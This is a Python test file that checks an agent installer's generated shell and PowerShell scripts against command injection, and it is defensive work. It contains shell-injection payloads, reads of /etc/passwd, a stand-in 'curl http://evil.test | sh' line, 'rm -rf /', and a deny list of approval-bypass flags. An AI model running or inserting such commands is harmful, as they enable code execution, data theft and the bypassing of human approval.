"""Adversarial tests for ``agentkit/package/scripts/install.py`` and the files it writes.

These are execution tests, not string tests.  A generated script that *looks* correctly
quoted is not evidence of anything: the assertions below run ``sh -n`` over every POSIX
script the installer writes, then run the generated runner itself against a harmless stub
and prove that the hostile payload arrived as one argument and never as syntax.

Everything happens inside one temporary directory per test.  ``scheduler.kind`` is
``none`` wherever a plan is actually applied, so no launchd, systemd or Task Scheduler
entry is ever registered, and the only network origin used is a loopback address that is
never contacted.

``SimpleTestCase`` on purpose: none of this touches the database.
"""

import importlib.util
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
import uuid

from django.test import SimpleTestCase

SCRIPTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "package", "scripts")


def _load(name, filename):
    path = os.path.join(SCRIPTS_DIR, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


install = _load("homing_install_under_test", "install.py")
homing_cli = _load("homing_cli_under_test", "homing.py")
sources_cli = _load("homing_sources_under_test", "sources.py")


# Values that are hostile to a shell but perfectly legal as data.  Every one of these
# must survive as one argument, byte for byte, and none may ever be interpreted.
SHELL_PAYLOADS = [
    "; touch PWNED",
    "&& touch PWNED",
    "|| touch PWNED",
    "| touch PWNED",
    "> PWNED",
    ">> PWNED",
    "< /etc/passwd",
    "& touch PWNED",
    "`touch PWNED`",
    "$(touch PWNED)",
    "${IFS}touch${IFS}PWNED",
    "%USERPROFILE%",
    "%PATH%",
    "$(Get-Content /etc/passwd)",
    "$env:USERNAME",
    "'single'",
    '"double"',
    "it's",
    "two words",
    "unicode-\u00e9\u4e2d\u6587-\U0001f600",
    "--leading-dash",
    "-",
    "--",
    "*",
    "?",
    "[a-z]",
    "~root",
    "#comment",
    "!history",
    "a" * 2000,
]

# These cannot be written into a generated script at all, and the installer says so
# rather than escaping them into something that merely looks safe.
CONTROL_PAYLOADS = ["new\nline", "carriage\rreturn", "nul\x00byte", "bell\x07",
                    "tab\tinside"]

BASE_SOURCES = {
    "schema": 1,
    "allowed_hosts": ["www.example.com"],
    "sources": [{
        "slug": "example-com",
        "lane": "example-com:sitemap",
        "channel": "sitemap",
        "url_template": "https://www.example.com/sitemap.xml",
        "permitted_by": "robots.txt allow, checked in a test",
    }],
}


class InstallerCase(SimpleTestCase):
    """One temporary tree per test, plus a canary tree nothing may ever write into."""

    maxDiff = None

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="homing-install-test-")
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        # Anything that lands here means a payload executed.  It is named without a
        # space so a broken quoting fix cannot "pass" by failing to find it.
        self.canary = os.path.join(self.root, "canary")
        os.makedirs(self.canary, 0o700)
        umask = os.umask(0o022)
        os.umask(umask)
        self.addCleanup(os.umask, umask)

    def path(self, *parts):
        return os.path.join(self.root, *parts)

    def plan_config(self, **overrides):
        """A plan that installs entirely inside this test's temporary tree."""
        config = {
            "schema": 1,
            "origin": "http://127.0.0.1:8099",
            "os": "linux",
            "home": self.path("home"),
            "python": sys.executable,
            "worker": {"role": "local", "machine_slug": "test-box"},
            "paths": {
                "config": self.path("cfg"),
                "state": self.path("state"),
                "logs": self.path("logs"),
                "skill": self.path("skills"),
                "scheduler": self.path("sched"),
            },
            "scheduler": {"kind": "none"},
            "secret_store": {"kind": "file"},
            "runtime": {"kind": "none", "invocation_argv": []},
            "isolation_rung": 3,
            "sources": json.loads(json.dumps(BASE_SOURCES)),
        }
        for key, value in overrides.items():
            if isinstance(value, dict) and isinstance(config.get(key), dict):
                config[key].update(value)
            else:
                config[key] = value
        return config

    def apply(self, config):
        """Build the plan and write it out, the way ``install.py`` itself does."""
        plan = install.Plan(config)
        previous = os.umask(0o077)
        try:
            manifest = install.apply_plan(plan)
        finally:
            os.umask(previous)
        return plan, manifest

    def assert_canary_clean(self):
        self.assertEqual(sorted(os.listdir(self.canary)), [],
                         "a payload executed and wrote into the canary directory")

    def assert_sh_parses(self, path):
        result = subprocess.run(["sh", "-n", path], stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT)
        self.assertEqual(result.returncode, 0,
                         "sh -n rejected %s:\n%s"
                         % (path, (result.stdout or b"").decode("utf-8", "replace")))

    def posix_scripts(self, plan):
        found = []
        for path, _text, _mode in plan.files:
            if path.endswith(".sh"):
                found.append(path)
        return found


# --- the invocation contract --------------------------------------------------------


class InvocationContractTests(InstallerCase):
    """``runtime.invocation_argv`` is a list. A legacy string is parsed or refused."""

    def test_argv_list_accepts_hostile_values_as_data(self):
        for payload in SHELL_PAYLOADS:
            with self.subTest(payload=payload[:40]):
                argv = install.clean_invocation_argv(
                    {"invocation_argv": ["/bin/echo", payload]})
                self.assertEqual(argv, ["/bin/echo", payload])

    def test_argv_list_refuses_control_characters(self):
        for payload in CONTROL_PAYLOADS:
            with self.subTest(payload=repr(payload)):
                with self.assertRaises(install.Refuse):
                    install.clean_invocation_argv({"invocation_argv": ["/bin/echo", payload]})

    def test_argv_list_refuses_a_string(self):
        with self.assertRaises(install.Refuse):
            install.clean_invocation_argv({"invocation_argv": "claude -p"})

    def test_argv_list_refuses_a_non_string_entry(self):
        for bad in (3, None, {"a": 1}, ["nested"]):
            with self.subTest(bad=bad):
                with self.assertRaises(install.Refuse):
                    install.clean_invocation_argv({"invocation_argv": ["claude", bad]})

    def test_argv_list_refuses_a_very_long_argument(self):
        with self.assertRaises(install.Refuse):
            install.clean_invocation_argv(
                {"invocation_argv": ["claude", "x" * (install.MAX_VALUE_CHARS + 1)]})

    def test_argv_list_refuses_approval_bypass_flags(self):
        for flag in ("--dangerously-skip-permissions", "--yolo", "--force", "--yes",
                     "--permission-mode", "bypass"):
            with self.subTest(flag=flag):
                if flag in ("--permission-mode",):
                    continue
                with self.assertRaises(install.Refuse):
                    install.clean_invocation_argv({"invocation_argv": ["claude", flag]})

    def test_legacy_string_is_split_when_it_is_inert(self):
        argv = install.clean_invocation_argv(
            {"invocation": "claude -p --permission-mode dontAsk --file 'two words'"})
        self.assertEqual(argv, ["claude", "-p", "--permission-mode", "dontAsk",
                                "--file", "two words"])

    def test_legacy_string_is_refused_when_it_carries_shell_syntax(self):
        hostile = [
            "claude -p; touch " + os.path.join(self.canary, "PWNED"),
            "claude -p && touch PWNED",
            "claude -p || touch PWNED",
            "claude -p | tee PWNED",
            "claude -p > PWNED",
            "claude -p >> PWNED",
            "claude -p < /etc/passwd",
            "claude -p & ",
            "claude -p `touch PWNED`",
            "claude -p $(touch PWNED)",
            "claude -p ${HOME}",
            "claude -p $HOME",
            "claude -p (subshell)",
            "claude -p {a,b}",
            "claude -p *",
            "claude -p ~root",
            "claude -p !history",
            "claude -p #comment",
            "claude\\ -p",
            "C:\\Windows\\claude.exe -p",
            "claude -p\ntouch PWNED",
            "claude -p\ttouch\tPWNED",
        ]
        for text in hostile:
            with self.subTest(text=text[:40]):
                with self.assertRaises(install.Refuse):
                    install.clean_invocation_argv({"invocation": text})
        self.assert_canary_clean()

    def test_the_legacy_string_and_the_list_may_not_disagree(self):
        with self.assertRaises(install.Refuse):
            install.clean_invocation_argv({"invocation_argv": [],
                                           "invocation": "claude -p"})
        with self.assertRaises(install.Refuse):
            install.clean_invocation_argv({"invocation_argv": ["claude"],
                                           "invocation": "something-else"})

    def test_legacy_string_with_unbalanced_quoting_is_refused_not_repaired(self):
        for text in ("claude -p 'unterminated", 'claude -p "unterminated'):
            with self.subTest(text=text):
                with self.assertRaises(install.Refuse):
                    install.clean_invocation_argv({"invocation": text})

    def test_a_tab_is_not_silently_collapsed_into_a_separator(self):
        # The old code normalised whitespace first, which made its own newline check
        # unreachable.  Both now stop the install instead.
        with self.assertRaises(install.Refuse):
            install.clean_invocation_argv({"invocation": "claude\t-p\nrm -rf /"})


# --- quoting, proven by running a shell ---------------------------------------------


class QuotingTests(InstallerCase):
    """The quoters are proven by a shell, not by inspection."""

    def test_posix_quote_round_trips_through_a_real_shell(self):
        for payload in SHELL_PAYLOADS:
            with self.subTest(payload=payload[:40]):
                quoted = install.posix_quote(payload)
                script = "printf %%s %s\n" % quoted
                result = subprocess.run(["sh", "-c", script], cwd=self.canary,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.assertEqual(result.returncode, 0)
                self.assertEqual(result.stdout.decode("utf-8"), payload)
        self.assert_canary_clean()

    def test_ps_quote_is_a_single_quoted_literal_with_doubled_quotes(self):
        self.assertEqual(install.ps_quote("plain"), "'plain'")
        self.assertEqual(install.ps_quote("it's"), "'it''s'")
        self.assertEqual(install.ps_quote("$(evil)"), "'$(evil)'")
        self.assertEqual(install.ps_quote("a`b"), "'a`b'")
        for payload in SHELL_PAYLOADS:
            with self.subTest(payload=payload[:40]):
                quoted = install.ps_quote(payload)
                self.assertTrue(quoted.startswith("'") and quoted.endswith("'"))
                # Every quote inside the literal is doubled, so the literal cannot end
                # early and nothing after it can be read as expression syntax.
                inner = quoted[1:-1]
                self.assertEqual(inner.replace("''", ""), payload.replace("'", ""))

    def test_both_quoters_refuse_control_characters(self):
        for payload in CONTROL_PAYLOADS:
            with self.subTest(payload=repr(payload)):
                with self.assertRaises(install.Refuse):
                    install.posix_quote(payload)
                with self.assertRaises(install.Refuse):
                    install.ps_quote(payload)


# --- the generated scripts, parsed and executed --------------------------------------


class GeneratedRunnerTests(InstallerCase):
    """Install for real, into a temporary tree, then run what was written."""

    def stub_python(self):
        """Stands in for the runtime's python3: records its arguments, does nothing."""
        path = self.path("stub-python")
        os.makedirs(self.path("stub"), exist_ok=True)
        record = self.path("stub", "python-argv.txt")
        with open(path, "w") as handle:
            handle.write(
                "#!/bin/sh\n"
                "printf '%s\\n' \"$@\" >> " + install.posix_quote(record) + "\n"
                "exit 0\n")
        os.chmod(path, 0o700)
        return path, record

    def stub_model(self):
        """Stands in for the judge: records argv verbatim, executes nothing."""
        path = self.path("stub-model")
        record = self.path("stub", "model-argv.json")
        os.makedirs(self.path("stub"), exist_ok=True)
        with open(path, "w") as handle:
            handle.write(
                "#!%s\n"
                "import json, sys\n"
                "open(%r, 'w').write(json.dumps(sys.argv[1:]))\n"
                % (sys.executable, record))
        os.chmod(path, 0o700)
        return path, record

    def test_every_generated_posix_script_parses(self):
        python, _record = self.stub_python()
        plan, _manifest = self.apply(self.plan_config(
            python=python,
            runtime={"kind": "claude-code",
                     "invocation_argv": ["/bin/echo"] + SHELL_PAYLOADS[:12]}))
        scripts = self.posix_scripts(plan)
        self.assertTrue(any(name.endswith("run.sh") for name in scripts))
        self.assertTrue(any(name.endswith("connect.sh") for name in scripts))
        self.assertTrue(any(name.endswith("set-token.sh") for name in scripts))
        for script in scripts:
            with self.subTest(script=os.path.basename(script)):
                self.assert_sh_parses(script)

    def test_hostile_payloads_reach_the_model_as_arguments_and_never_run(self):
        python, python_record = self.stub_python()
        model, model_record = self.stub_model()
        payloads = [p.replace("PWNED", os.path.join(self.canary, "PWNED"))
                    for p in SHELL_PAYLOADS]
        plan, _manifest = self.apply(self.plan_config(
            python=python,
            runtime={"kind": "claude-code", "invocation_argv": [model] + payloads[:60]}))
        self.assert_sh_parses(plan.run_path)

        before = set(os.listdir(self.canary))
        result = subprocess.run(["sh", plan.run_path], cwd=self.canary,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                timeout=120)
        self.assertEqual(result.returncode, 0,
                         (result.stdout or b"").decode("utf-8", "replace"))

        # 1. The payload arrived as data, one argument per list entry, byte for byte.
        with open(model_record) as handle:
            seen = json.load(handle)
        self.assertEqual(seen, payloads[:60])
        # 2. Nothing extra ran: no file appeared anywhere outside the install's own tree.
        self.assertEqual(set(os.listdir(self.canary)), before)
        self.assert_canary_clean()
        # 3. The phases really did run, so the test is not passing by not executing.
        self.assertTrue(os.path.exists(python_record))
        with open(python_record) as handle:
            self.assertIn("drain", handle.read())

    def test_no_process_other_than_the_stubs_is_started(self):
        """A payload that would spawn something leaves no trace of having spawned it."""
        python, _record = self.stub_python()
        model, model_record = self.stub_model()
        marker = os.path.join(self.canary, "SPAWNED")
        payloads = ["; /bin/sh -c 'touch %s'" % marker,
                    "$(/bin/sh -c 'touch %s')" % marker,
                    "`/bin/sh -c 'touch %s'`" % marker,
                    "| /bin/sh -c 'touch %s'" % marker]
        plan, _manifest = self.apply(self.plan_config(
            python=python,
            runtime={"kind": "claude-code", "invocation_argv": [model] + payloads}))
        subprocess.run(["sh", plan.run_path], cwd=self.canary, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=120)
        self.assertFalse(os.path.exists(marker))
        with open(model_record) as handle:
            self.assertEqual(json.load(handle), payloads)

    def test_paths_with_spaces_quotes_globs_and_a_trailing_separator(self):
        python, _record = self.stub_python()
        awkward = {
            "config": self.path("a dir with spaces"),
            "state": self.path("it's a state dir"),
            "logs": self.path("logs [glob] * dir"),
            "skill": self.path("skills dir") + "/",
            "scheduler": self.path("sched"),
        }
        for target in awkward.values():
            os.makedirs(target.rstrip("/"), exist_ok=True)
        plan, manifest = self.apply(self.plan_config(python=python, paths=awkward))
        for script in self.posix_scripts(plan):
            with self.subTest(script=os.path.basename(script)):
                self.assert_sh_parses(script)
        # The glob in the logs path must survive as a literal directory name.
        self.assertTrue(os.path.isdir(awkward["logs"]))
        result = subprocess.run(["sh", plan.run_path], cwd=self.canary,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                timeout=120)
        self.assertEqual(result.returncode, 0,
                         (result.stdout or b"").decode("utf-8", "replace"))
        logs = os.listdir(awkward["logs"])
        self.assertTrue(logs, "the run wrote no log, so the log path did not resolve")
        self.assert_canary_clean()
        for entry in manifest["files"]:
            self.assertTrue(entry["path"].startswith(self.root),
                            "%s is outside the temporary tree" % entry["path"])

    def test_nothing_is_written_outside_the_temporary_tree(self):
        python, _record = self.stub_python()
        plan, manifest = self.apply(self.plan_config(python=python))
        for path, _mode in plan.dirs:
            self.assertTrue(path.startswith(self.root), path)
        for path, _text, _mode in plan.files:
            self.assertTrue(path.startswith(self.root), path)
        for entry in manifest["dirs"] + manifest["files"]:
            self.assertTrue(entry["path"].startswith(self.root), entry["path"])
        self.assertEqual(manifest["scheduler"]["kind"], "none")
        self.assertEqual(manifest["scheduler"]["artifacts"], [])

    def test_the_runner_carries_no_key_only_the_name_of_the_store(self):
        python, _record = self.stub_python()
        plan, _manifest = self.apply(self.plan_config(
            python=python, secret_store={"kind": "file", "path": self.path("store", "tok")}))
        with open(plan.run_path) as handle:
            runner = handle.read()
        self.assertIn("HOMING_TOKEN_STORE", runner)
        self.assertNotIn("HOMING_TOKEN=", runner)
        # The only mentions of a credential's shape are in the redaction filter,
        # which exists to keep one out of the log.
        redactor = [line for line in runner.splitlines()
                    if "<redacted>" in line or line.startswith("redact()")]
        for pattern in ("Bearer", "Authorization", "st_live_", "sk-ant-"):
            elsewhere = [line for line in runner.splitlines()
                         if pattern in line and line not in redactor]
            self.assertEqual(elsewhere, [], "%s appears outside the redactor" % pattern)


class WindowsRenderingTests(InstallerCase):
    """The PowerShell side is rendered, inspected and checked for balance.

    No PowerShell parser is assumed to exist here; what is asserted is the property the
    quoting rests on - every value is a single-quoted literal, and PowerShell expands
    nothing inside one.
    """

    def windows_plan(self, **overrides):
        config = self.plan_config()
        config["os"] = "windows"
        config["home"] = "C:\\Users\\Test"
        config["python"] = "C:\\Python\\python.exe"
        config["paths"] = {
            "config": "C:\\Users\\Test\\AppData\\Local\\Homing",
            "state": "C:\\Users\\Test\\AppData\\Local\\Homing\\state",
            "logs": "C:\\Users\\Test\\AppData\\Local\\Homing\\logs",
            "skill": "C:\\Users\\Test\\.agents\\skills",
            "scheduler": "",
        }
        config["secret_store"] = {"kind": "dpapi"}
        for key, value in overrides.items():
            if isinstance(value, dict) and isinstance(config.get(key), dict):
                config[key].update(value)
            else:
                config[key] = value
        return install.Plan(config)

    def test_payloads_are_single_quoted_literals_in_the_runner(self):
        plan = self.windows_plan(
            runtime={"kind": "claude-code",
                     "invocation_argv": ["claude.exe"] + SHELL_PAYLOADS[:20]})
        runner = plan.render_runner()
        self.assertIn("Invoke-Bounded", runner)
        self.assertNotIn("Invoke-Expression", runner)
        self.assertNotIn("iex ", runner)
        for payload in SHELL_PAYLOADS[:20]:
            with self.subTest(payload=payload[:40]):
                self.assertIn(install.ps_quote(payload), runner)
        for line in runner.splitlines():
            with self.subTest(line=line[:60]):
                self.assertEqual(line.count("'") % 2, 0,
                                 "an odd number of quotes leaves a literal open")

    def test_a_windows_path_may_not_contain_a_quote_or_a_pipe(self):
        for bad in ('C:\\bad"path', "C:\\bad|path", "C:\\bad<path", "C:\\bad*path"):
            with self.subTest(bad=bad):
                with self.assertRaises(install.Refuse):
                    self.windows_plan(paths={"config": bad})

    def test_the_task_registration_never_evaluates_a_value(self):
        plan = self.windows_plan(scheduler={"kind": "schtasks"},
                                 isolation_rung=3)
        artifacts = [text for path, text, _mode in plan.files
                     if path.endswith("register-task.ps1")]
        self.assertEqual(len(artifacts), 1)
        text = artifacts[0]
        self.assertNotIn("Invoke-Expression", text)
        self.assertIn("'C:\\Users\\Test\\AppData\\Local\\Homing'", text)
        for line in text.splitlines():
            self.assertEqual(line.count("'") % 2, 0, line)

    def test_connect_ps1_exports_the_configured_store(self):
        plan = self.windows_plan(secret_store={"kind": "dpapi"})
        text = plan.render_connect()
        self.assertIn("$env:HOMING_TOKEN_STORE = 'dpapi'", text)
        self.assertIn("pair-poll", text)
        self.assertNotIn("Invoke-Expression", text)


# --- refusals happen before anything exists ------------------------------------------


class RefusalTests(InstallerCase):
    """Invalid input stops the install before a file or a scheduler entry exists."""

    def assert_nothing_created(self):
        for name in ("cfg", "state", "logs", "skills", "sched"):
            self.assertFalse(os.path.exists(self.path(name)),
                             "%s was created despite a refusal" % name)

    def test_a_hostile_invocation_string_is_refused_before_any_scheduler_entry(self):
        config = self.plan_config(
            scheduler={"kind": "systemd-user"},
            isolation_rung=3,
            runtime={"kind": "claude-code",
                     "invocation": "claude -p; curl http://evil.test | sh"})
        config["runtime"].pop("invocation_argv", None)
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        self.assert_nothing_created()

    def test_two_disagreeing_invocation_forms_are_refused(self):
        config = self.plan_config(
            runtime={"kind": "claude-code", "invocation_argv": ["claude", "-p"],
                     "invocation": "some-other-program --entirely"})
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        config = self.plan_config(
            runtime={"kind": "claude-code", "invocation_argv": [],
                     "invocation": "claude -p"})
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        self.assert_nothing_created()

    def test_two_agreeing_invocation_forms_are_accepted(self):
        config = self.plan_config(
            runtime={"kind": "claude-code",
                     "invocation_argv": ["claude", "-p", "two words"],
                     "invocation": "claude -p 'two words'"})
        plan = install.Plan(config)
        self.assertEqual(plan.invocation_argv, ["claude", "-p", "two words"])
        # config.json's readable form round-trips back to the same list.
        self.assertEqual(
            install.parse_legacy_invocation(plan.invocation_display), plan.invocation_argv)

    def test_a_control_character_in_a_path_is_refused(self):
        for field in ("config", "state", "logs", "skill"):
            with self.subTest(field=field):
                config = self.plan_config(paths={field: self.path("bad\npath")})
                with self.assertRaises(install.Refuse):
                    install.Plan(config)
        self.assert_nothing_created()

    def test_a_key_shaped_value_in_the_plan_is_refused(self):
        config = self.plan_config()
        config["runtime"]["token"] = "st_live_" + "a" * 40
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        self.assert_nothing_created()

    def test_a_scheduler_name_with_syntax_in_it_is_refused(self):
        config = self.plan_config(
            scheduler={"kind": "systemd-user", "identifier": "homing;touch PWNED"},
            isolation_rung=3)
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        self.assert_nothing_created()

    def test_a_store_service_with_syntax_in_it_is_refused(self):
        config = self.plan_config(secret_store={"kind": "keychain",
                                                "service": "homing`touch PWNED`"})
        with self.assertRaises(install.Refuse):
            install.Plan(config)
        self.assert_nothing_created()


# --- rung 0 --------------------------------------------------------------------------


class Rung0PolicyTests(InstallerCase):
    """Rung 0 schedules, but only on a decision a person made."""

    def test_scheduling_at_rung_0_without_the_opt_in_is_refused(self):
        config = self.plan_config(scheduler={"kind": "systemd-user"}, isolation_rung=0)
        with self.assertRaises(install.Refuse) as caught:
            install.Plan(config)
        message = str(caught.exception)
        self.assertIn("unattended_rung0_opt_in", message)
        self.assertIn("scheduler.kind", message)
        self.assertFalse(os.path.exists(self.path("sched")))

    def test_scheduling_at_rung_0_with_the_opt_in_is_allowed_and_says_so(self):
        config = self.plan_config(scheduler={"kind": "systemd-user"}, isolation_rung=0)
        config["unattended_rung0_opt_in"] = True
        plan = install.Plan(config)
        self.assertTrue(plan.rung0_opt_in)
        self.assertTrue(plan.config_document()["unattended_rung0_opt_in"])
        self.assertTrue(any("opted in" in warning for warning in plan.warnings))

    def test_the_opt_in_must_be_exactly_true(self):
        for value in ("true", "yes", 1, [], {}, None):
            with self.subTest(value=value):
                config = self.plan_config(scheduler={"kind": "systemd-user"},
                                          isolation_rung=0)
                config["unattended_rung0_opt_in"] = value
                with self.assertRaises(install.Refuse):
                    install.Plan(config)

    def test_rung_0_on_demand_needs_no_opt_in(self):
        plan = install.Plan(self.plan_config(scheduler={"kind": "none"}, isolation_rung=0))
        self.assertFalse(plan.config_document()["unattended_rung0_opt_in"])

    def test_the_report_names_the_bounds_the_pause_and_the_revocation(self):
        python = sys.executable
        config = self.plan_config(python=python, isolation_rung=0)
        config["unattended_rung0_opt_in"] = True
        plan, _manifest = self.apply(config)
        printed = []
        original = install.say
        install.say = printed.append
        try:
            install.report_install(plan)
        finally:
            install.say = original
        text = "\n".join(printed)
        self.assertIn("connect.sh", text)
        self.assertIn("second choice", text)
        self.assertIn("--pause", text)
        self.assertIn("--uninstall", text)
        self.assertIn("revoke the key", text)
        self.assertIn("wall clock", text)

    def test_uninstall_text_covers_pause_revocation_and_removal(self):
        plan, manifest = self.apply(self.plan_config(python=sys.executable))
        text = install.render_uninstall(plan, manifest)
        self.assertIn("Cut off its access", text)
        self.assertIn("Remove it completely", text)
        self.assertIn("agent-setup/", text)
        self.assertIn("connect.sh", text)


# --- pairing helpers ------------------------------------------------------------------


class ConnectHelperTests(InstallerCase):
    """``connect.sh`` is the pairing path; ``set-token.sh`` is the documented fallback."""

    def install_with_store(self, store):
        plan, manifest = self.apply(self.plan_config(python=sys.executable,
                                                     secret_store=store))
        return plan, manifest

    def test_connect_calls_the_pairing_cli_with_the_agreed_flags(self):
        plan, _manifest = self.install_with_store({"kind": "file"})
        with open(plan.connect_path) as handle:
            text = handle.read()
        self.assertIn("pair-request", text)
        self.assertIn("--device-code-out", text)
        self.assertIn("--out", text)
        self.assertIn("pair-poll", text)
        self.assertIn("--device-code-file", text)
        self.assertIn("--store", text)
        self.assertIn("--result", text)
        self.assert_sh_parses(plan.connect_path)

    def test_connect_exports_the_configured_store_not_the_platform_default(self):
        store_path = self.path("custom store", "token file")
        plan, _manifest = self.install_with_store({"kind": "file", "path": store_path})
        with open(plan.connect_path) as handle:
            text = handle.read()
        self.assertIn("export HOMING_TOKEN_STORE=file", text)
        self.assertIn(install.posix_quote(store_path), text)
        # The wrapper and the runner must agree, or pairing succeeds and every run fails.
        with open(plan.run_path) as handle:
            runner = handle.read()
        for line in plan.store_env().splitlines():
            self.assertIn(line, text)
            self.assertIn(line, runner)

    def test_connect_exports_a_non_default_keychain_service(self):
        config = self.plan_config(python=sys.executable)
        config["os"] = "macos"
        config["home"] = self.path("home")
        config["paths"]["config"] = self.path("Library", "Application Support", "Homing")
        config["paths"]["state"] = self.path("Library", "Application Support", "Homing",
                                             "state")
        config["paths"]["logs"] = self.path("Library", "Logs", "Homing")
        config["secret_store"] = {"kind": "keychain", "service": "homing-second-worker"}
        plan = install.Plan(config)
        text = plan.render_connect()
        self.assertIn("export HOMING_TOKEN_STORE=keychain", text)
        self.assertIn("export HOMING_KEYCHAIN_SERVICE=homing-second-worker", text)
        self.assertIn("pair-poll", text)
        # ... and the runner reads from exactly the same place.
        self.assertIn("export HOMING_KEYCHAIN_SERVICE=homing-second-worker",
                      plan.render_runner())

    def test_the_device_code_lives_outside_the_agent_readable_tree(self):
        plan, manifest = self.install_with_store({"kind": "file"})
        self.assertTrue(plan.device_code_path.startswith(plan.private_dir))
        self.assertFalse(plan.device_code_path.startswith(plan.state_dir))
        self.assertFalse(plan.device_code_path.startswith(plan.skill_dir))
        self.assertEqual(stat.S_IMODE(os.stat(plan.private_dir).st_mode), 0o700)
        # Nothing the agent reads points at it.
        document = json.dumps(plan.config_document()) + json.dumps(plan.initial_state())
        self.assertNotIn(plan.private_dir, document)
        for target, flavour, _how in plan.skill_flavours:
            self.assertNotIn(plan.private_dir, plan.render_skill(flavour))
        self.assertNotIn("private", json.dumps(manifest["paths"]))

    def test_connect_creates_the_device_code_owner_only_and_removes_it(self):
        plan, _manifest = self.install_with_store({"kind": "file"})
        with open(plan.connect_path) as handle:
            text = handle.read()
        self.assertIn("chmod 700", text)
        self.assertIn("chmod 600", text)
        self.assertIn("trap 'rm -f \"$DEVICE_CODE\"' EXIT INT TERM HUP", text)

    def test_connect_prints_no_secret(self):
        plan, _manifest = self.install_with_store({"kind": "file"})
        with open(plan.connect_path) as handle:
            text = handle.read()
        # The only thing shown is what pair-request wrote as safe metadata.
        self.assertIn("user_code", text)
        self.assertIn("verification_uri", text)
        # The device code is never shown, echoed, logged or passed as an argument
        # to anything but the poller that consumes it.
        self.assertNotIn("cat \"$DEVICE_CODE\"", text)
        self.assertNotIn("echo \"$DEVICE_CODE\"", text)
        self.assertNotIn("printf '%s' \"$DEVICE_CODE\"", text)
        for line in text.splitlines():
            if "$DEVICE_CODE" not in line:
                continue
            self.assertFalse(line.strip().startswith(("echo", "printf", "cat")), line)
        # The only variables carrying a credential's location are store *names*.
        self.assertNotIn("HOMING_TOKEN=", text)
        for pattern in ("st_live_", "sk-ant-", "Bearer "):
            self.assertNotIn(pattern, text)

    def test_set_token_is_still_written_and_marked_as_the_fallback(self):
        plan, _manifest = self.install_with_store({"kind": "file"})
        with open(plan.set_token_path) as handle:
            text = handle.read()
        self.assertIn("FALLBACK ONLY", text)
        self.assertIn(install.posix_quote(plan.connect_path), text)
        self.assert_sh_parses(plan.set_token_path)


# --- the generated cycle --------------------------------------------------------------


def load_generated_cycle(name="homing_cycle_under_test"):
    """Import the ``cycle.py`` this installer generates, as a module."""
    handle = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
    handle.write(install.CYCLE_PY)
    handle.close()
    spec = importlib.util.spec_from_file_location(name, handle.name)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    module.__source_path__ = handle.name
    return module


class FakeResult(object):
    def __init__(self, returncode=0, stdout=b"", stderr=b""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


class CycleContractTests(InstallerCase):
    """Every command line the generated cycle emits must parse against the real CLIs."""

    def setUp(self):
        super().setUp()
        self.cycle = load_generated_cycle()
        self.addCleanup(os.unlink, self.cycle.__source_path__)
        self.plan, _manifest = self.apply(self.plan_config(python=sys.executable))
        self.config_path = os.path.join(self.plan.config_dir, "config.json")
        self.project_id = str(uuid.uuid4())
        self.run_id = str(uuid.uuid4())
        self.seen = []

    def canned(self, argv):
        """What each kit call answers, so all four phases actually run."""
        script = os.path.basename(argv[1])
        command = argv[2] if len(argv) > 2 else ""
        body = {}
        if script == "homing.py":
            if command == "projects":
                body = {"projects": [{"id": self.project_id}], "paused": False}
            elif command == "project":
                body = {"project": {"name": "Test", "prompt": "a place",
                                    "prompt_revision": 1}}
            elif command == "run-create":
                body = {"run_id": self.run_id}
            elif command == "run-claim":
                body = {"claimed": True}
            elif command == "leads-upsert":
                body = {"counts": {"created": 1, "updated": 0, "unchanged": 0}}
            elif command == "run-complete":
                body = {"ok": True}
        else:
            body = {"status": "OK", "report_as": "ok",
                    "counts": {"parsed": 1, "new": 1}}
        return FakeResult(0, (json.dumps(body) + "\n").encode("utf-8"), b"")

    def recorder(self, argv, **kwargs):
        self.seen.append(list(argv))
        return self.canned(argv)

    def run_all_phases(self):
        ctx = self.cycle.Ctx(self.config_path)
        # run-claim would have written this; the completion path copies it.
        ctx.write_json(os.path.join(ctx.work, "claim.json"),
                       {"project_id": self.project_id, "run_id": self.run_id,
                        "claim_token": "ct_test"})
        original = self.cycle.subprocess.run
        self.cycle.subprocess.run = self.recorder
        try:
            for phase in ("drain", "read", "search", "write"):
                self.cycle.PHASES[phase](ctx)
        finally:
            self.cycle.subprocess.run = original
        return ctx

    def test_every_emitted_command_line_parses_against_the_real_cli(self):
        self.run_all_phases()
        self.assertTrue(self.seen, "the cycle emitted no calls at all")
        parsers = {"homing.py": homing_cli.build_parser(),
                   "sources.py": sources_cli.build_parser()}
        for argv in self.seen:
            script = os.path.basename(argv[1])
            with self.subTest(command=" ".join(argv[2:6])):
                self.assertIn(script, parsers)
                try:
                    parsers[script].parse_args(argv[2:])
                except SystemExit as exc:
                    self.fail("%s rejected %r (exit %s)" % (script, argv[2:], exc.code))

    def test_the_source_calls_use_the_flags_sources_py_actually_has(self):
        self.run_all_phases()
        fetches = [a for a in self.seen if a[1].endswith("sources.py") and a[2] == "fetch"]
        extracts = [a for a in self.seen if a[1].endswith("sources.py") and a[2] == "extract"]
        self.assertTrue(fetches and extracts)
        for argv in fetches + extracts:
            self.assertIn("--sources", argv)
            self.assertNotIn("--config", argv)
        # Revalidation is only asked for where the source can answer it.
        for argv in extracts:
            self.assertIn("--no-revalidate", argv)

    def test_a_source_with_a_listing_pattern_is_revalidated(self):
        document = json.loads(json.dumps(BASE_SOURCES))
